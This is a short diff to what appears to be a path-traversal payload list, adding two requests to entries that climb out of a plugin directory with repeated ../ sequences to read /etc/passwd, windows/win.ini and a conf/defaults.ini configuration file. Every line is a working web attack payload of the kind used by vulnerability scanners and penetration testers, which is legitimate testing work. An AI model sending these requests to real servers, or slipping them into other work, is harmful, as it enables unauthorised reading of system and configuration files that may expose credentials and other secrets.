@@ -7,3 +7,5 @@
 /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini
 /public/plugins/alertlist/../../../../../conf/defaults.ini
 /public/plugins/{{pluginSlug}}/../../../../../../../../../../../../../../../../../../../etc/passwd
+/public/plugins/{{plugin-id}}/../../../../../../../../../../../../../../../../../../../etc/passwd
+/public/plugins/{{pluginSlug}}/../../../../../conf/defaults.ini
